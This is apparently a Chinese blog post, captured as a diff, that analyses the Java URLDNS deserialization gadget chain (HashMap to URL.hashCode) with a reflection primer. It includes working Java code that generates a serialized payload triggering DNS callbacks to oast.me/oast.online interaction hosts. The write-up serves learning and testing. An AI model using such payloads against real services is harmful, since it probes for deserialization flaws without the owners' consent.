+<p>反序列化要求：当前类可被序列化（继承自Serializable），并且重写了readObject，参数类型宽泛，最好是jdk自带的类。</p>
+<p>简单解释：序列化A<br>A的要求：继承自Serializable<br>如果A参数类型宽泛，A(B,C);<br>A要通用，比如：我在当前程序1中有这个A，程序2中也有A（最好是jdk自带的类）</p>
+<h1 id="Dnslog链分析"><a href="#Dnslog链分析" class="headerlink" title="Dnslog链分析"></a>Dnslog链分析</h1><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>HashMap继承自Serializable<br><img src="/images/Pasted%20image%2020240620141240.png"><br>并且重写了readObject<br><img src="/images/Pasted%20image%2020240620141358.png"></p>
+<p>读了key和value，接着调用了hash方法<br><img src="/images/Pasted%20image%2020240620141713.png"></p>
+<p>跟进hash方法，如果key不为空，就调用key的hashCode方法<br><img src="/images/Pasted%20image%2020240620142409.png"></p>
+<h2 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h2><p>url中存在方法hashCode方法<br><img src="/images/Pasted%20image%2020240620145042.png"><br>如果hashCode等于-1则调用hashCode，hashCode中dns解析了传入的u<br><img src="/images/Pasted%20image%2020240620145131.png"></p>
+<h2 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h2><p>案例1：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="comment">// 将url类传入hashmap  </span></span><br><span class="line">    hashmapt.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://url.cpps938sfi0uebpoqm70znshpnts6idif.oast.online&quot;</span>), <span class="number">1</span>);  </span><br><span class="line">    <span class="comment">// 通过put设置url目标地址  </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 序列化对象  </span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>);  </span><br><span class="line">    <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容  </span></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">    <span class="comment">// 将数据输出流连接到fileOut对象  </span></span><br><span class="line">    out.writeObject(hashmapt);  </span><br><span class="line">    out.close();  </span><br><span class="line">    fileOut.close();  </span><br><span class="line">    System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">    e.printStackTrace();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行发现程序自动访问了该地址<br><img src="/images/Pasted%20image%2020240620144755.png"></p>
+<p>调试下，查看调用链，步入put函数<br><img src="/images/Pasted%20image%2020240620150347.png"></p>
+<p>调用了java.util.HashMap#hash函数，步入进去<br><img src="/images/Pasted%20image%2020240620150520.png"></p>
+<p>调用了key的hashCode函数，实际就是java.net.URL#hashCode<br><img src="/images/Pasted%20image%2020240620150650.png"><br>跟进hashCode<br><img src="/images/Pasted%20image%2020240620150639.png"></p>
+<p>再次跟进handler.hashCode，在getHostAddress对域名进行了解析<br><img src="/images/Pasted%20image%2020240620150745.png"></p>
+<p>而后进行序列化，实际上hashCode值在上述流程中已经改变，不再是-1，而是对应hash值，所以即使此处序列化成功，我们进行反序列化时也无法进行dns解析。<br><img src="/images/Pasted%20image%2020240620150950.png"></p>
+<p>所以如何保证在序列化时hashCode值为-1呢？</p>
+<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><blockquote>
+<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。Java反射机制在框架设计中极为广泛，需要深入理解。本文综合多篇文章后，总结了Java 反射的相关知识，希望可以提升你对Java中反射的认知效率。</p>
+</blockquote>
+<ul>
+<li>再来看看 <strong>Class类的方法</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>方法名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>forName()</td>
+<td>(1)获取Class对象的一个引用，但引用的类还没有加载(该类的第一个对象没有生成)就加载了这个类。</td>
+</tr>
+<tr>
+<td></td>
+<td>(2)为了产生Class引用，forName()立即就进行了初始化。</td>
+</tr>
+<tr>
+<td>Object-getClass()</td>
+<td>获取Class对象的一个引用，返回表示该对象的实际类型的Class引用。</td>
+</tr>
+<tr>
+<td>getName()</td>
+<td>取全限定的类名(包括包名)，即类的完整名字。</td>
+</tr>
+<tr>
+<td>getSimpleName()</td>
+<td>获取类名(不包括包名)</td>
+</tr>
+<tr>
+<td>getCanonicalName()</td>
+<td>获取全限定的类名(包括包名)</td>
+</tr>
+<tr>
+<td>isInterface()</td>
+<td>判断Class对象是否是表示一个接口</td>
+</tr>
+<tr>
+<td>getInterfaces()</td>
+<td>返回Class对象数组，表示Class对象所引用的类所实现的所有接口。</td>
+</tr>
+<tr>
+<td>getSupercalss()</td>
+<td>返回Class对象，表示Class对象所引用的类所继承的直接基类。应用该方法可在运行时发现一个对象完整的继承结构。</td>
+</tr>
+<tr>
+<td>newInstance()</td>
+<td>返回一个Oject对象，是实现“虚拟构造器”的一种途径。使用该方法创建的类，必须带有无参的构造器。</td>
+</tr>
+<tr>
+<td>getFields()</td>
+<td>获得某个类的所有的公共（public）的字段，包括继承自父类的所有公共字段。 类似的还有getMethods和getConstructors。</td>
+</tr>
+<tr>
+<td>getDeclaredFields</td>
+<td>获得某个类的自己声明的字段，即包括public、private和proteced，默认但是不包括父类声明的任何字段。类似的还有getDeclaredMethods和getDeclaredConstructors。</td>
+</tr>
+</tbody></table>
+<p>获取Constructor对象是通过Class类中的方法获取的，Class类与Constructor相关的主要方法如下：</p>
+<table>
+<thead>
+<tr>
+<th>方法返回值</th>
+<th>方法名称</th>
+<th>方法说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>static Class&lt;?&gt;</td>
+<td>forName(String className)</td>
+<td>返回与带有给定字符串名的类或接口相关联的 Class 对象。</td>
+</tr>
+<tr>
+<td>Constructor</td>
+<td>getConstructor(Class&lt;?&gt;… parameterTypes)</td>
+<td>返回指定参数类型、具有public访问权限的构造函数对象</td>
+</tr>
+<tr>
+<td>Constructor&lt;?&gt;[]</td>
+<td>getConstructors()</td>
+<td>返回所有具有public访问权限的构造函数的Constructor对象数组</td>
+</tr>
+<tr>
+<td>Constructor</td>
+<td>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td>
+<td>返回指定参数类型、所有声明的（包括private）构造函数对象</td>
+</tr>
+<tr>
+<td>Constructor&lt;?&gt;[]</td>
+<td>getDeclaredConstructors()</td>
+<td>返回所有声明的（包括private）构造函数对象</td>
+</tr>
+<tr>
+<td>Constructor&lt;?&gt;[]</td>
+<td>getConstructors()</td>
+<td>返回所有具有public访问权限的构造函数的Constructor对象数组</td>
+</tr>
+<tr>
+<td>T</td>
+<td>newInstance()</td>
+<td>调用无参构造器创建此 Class 对象所表示的类的一个新实例。</td>
+</tr>
+</tbody></table>
+<p>案例分析：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;admin&quot;</span>,<span class="number">33</span>);  </span><br><span class="line">        <span class="comment">// 实例化Person类  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;反射前：&quot;</span>+person);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> person.getClass();  </span><br><span class="line">        <span class="comment">// 通过反射获取类的原型  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personConstructor</span> <span class="operator">=</span> a.getConstructor(String.class, <span class="type">int</span>.class);  </span><br><span class="line">        <span class="comment">// 利用getConstructor构造函数而后进行实例化传入参数  </span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personConstructor.newInstance(<span class="string">&quot;man&quot;</span>, <span class="number">22</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;反射后：&quot;</span>+p);  </span><br><span class="line">  </span><br><span class="line">        Field[] canshuType = a.getDeclaredFields();  </span><br><span class="line">        <span class="comment">// 获取某个类的自己声明的字段，使用for循环输出其类型  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;输出Person类申明的字段类型：&quot;</span>);  </span><br><span class="line">        <span class="keyword">for</span>(Field i:canshuType)&#123;  </span><br><span class="line">            System.out.println(i);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">canshu</span> <span class="operator">=</span> a.getDeclaredField(<span class="string">&quot;name&quot;</span>);  </span><br><span class="line">        <span class="comment">// 通过getDeclaredField获取类的字段  </span></span><br><span class="line">        canshu.set(p,<span class="string">&quot;zhangsan&quot;</span>);  </span><br><span class="line">        <span class="comment">// 通过set设置字段值  </span></span><br><span class="line">        System.out.println(p);  </span><br><span class="line">        <span class="comment">// 输出修改后的结果  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用反射修改hashCode值而后序列化"><a href="#利用反射修改hashCode值而后序列化" class="headerlink" title="利用反射修改hashCode值而后序列化"></a>利用反射修改hashCode值而后序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Urldnslog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            <span class="comment">// 将url类传入hashmap</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://z1sec.cpqn9cosfi0il0kidbb096hu4sxqd4hhw.oast.me&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">n_value</span> <span class="operator">=</span> n.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            n_value.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            n_value.set(u,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">            hashmapt.put(u, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 通过put设置url目标地址</span></span><br><span class="line"></span><br><span class="line">            n_value.set(u,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化对象</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns2.ser&quot;</span>);</span><br><span class="line">            <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            <span class="comment">// 将数据输出流连接到fileOut对象</span></span><br><span class="line">            out.writeObject(hashmapt);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逐行分析下：</p>
+<ul>
+<li><p>将url类传入hashmap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实例化URL对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cpqn9cosfi0il0kidbb096hu4sxqd4hhw.oast.me&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过反射获取java.net.URL类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过getDeclaredField反射获取URL类中定义的字段（获取hashCode）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">n_value</span> <span class="operator">=</span> n.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由于hashCode为私有属性，可通过setAccessible设置变量可被更改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n_value.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置hashCode值为1000，在下面进行put时调用java.net.URL#hashCode则不会进入java.net.URLStreamHandler#hashCode，进而不会调用到getHostAddress对url进行解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n_value.set(u,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过put设置URL实例方便后续序列化调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashmapt.put(u, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将hashCode重新设置为-1，进行反序列化，进而在反序列化时可调用到getHostAddress，触发解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n_value.set(u,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>但是运行发现会报错：<br><img src="/images/Pasted%20image%2020240620171602.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.InaccessibleObjectException: Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens java.net&quot; to module com.maven_2.maven_2</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class="line">	at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:180)</span><br><span class="line">	at java.base/java.lang.reflect.Field.setAccessible(Field.java:174)</span><br><span class="line">	at com.maven_2.maven_2/com.maven_2.Urldnslog.main(Urldnslog.java:21)</span><br></pre></td></tr></table></figure>
+
+<p>解决方式：</p>
+<blockquote>
+<p>这个问题是因为在 Java 9 及更高版本中，模块化系统的引入导致一些限制，对于非公开的 API 访问做出了更严格的限制。在你的代码中，你试图通过反射修改<code>java.net.URL</code>类中的私有字段<code>hashCode</code>，但是由于模块化系统的限制，你的模块没有权限访问<code>java.net</code>模块中私有成员。</p>
+</blockquote>
+<p>为了解决这个问题，你可以直接使用jdk8进行编译运行。<br><img src="/images/Pasted%20image%2020240621205737.png"><br><img src="/images/Pasted%20image%2020240621205756.png"><br><img src="/images/Pasted%20image%2020240621205814.png"><br>序列化成功，此时dns是不会有任何记录的。</p>
+<p>接着对序列化文件进行反序列化，则会触发getHostAddress对目标域名进行反序列化操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeSerializationExample1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 反序列化对象  </span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns2.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 读取person.ser  </span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            <span class="comment">// 通过fileIn对象连接到文件中，以便读取文件中序列化的 Java 对象数据，进行反序列化操作  </span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) in.readObject();  </span><br><span class="line">            <span class="comment">// // 从文件中读取一个 Java 对象，并将其保存为 Person 类型的变量  </span></span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">            System.out.println(deserializedPerson);  </span><br><span class="line">            <span class="comment">// 输出  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功接收到请求：<br><img src="/images/Pasted%20image%2020240621211832.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/parttime/index.html">PartTime</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Java原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E9%80%A0%E6%88%90%E5%8D%B1%E9%99%A9%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">可能造成危险的方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dnslog%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Dnslog链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap"><span class="toc-number">2.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Url"><span class="toc-number">2.2.</span> <span class="toc-text">Url</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">2.4.</span> <span class="toc-text">反射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9hashCode%E5%80%BC%E8%80%8C%E5%90%8E%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text">利用反射修改hashCode值而后序列化</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&text=Java原生反序列化+Dnslog链分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Java原生反序列化+Dnslog链分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java原生反序列化+Dnslog链分析&body=Check out this article: http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&name=Java原生反序列化+Dnslog链分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&t=Java原生反序列化+Dnslog链分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
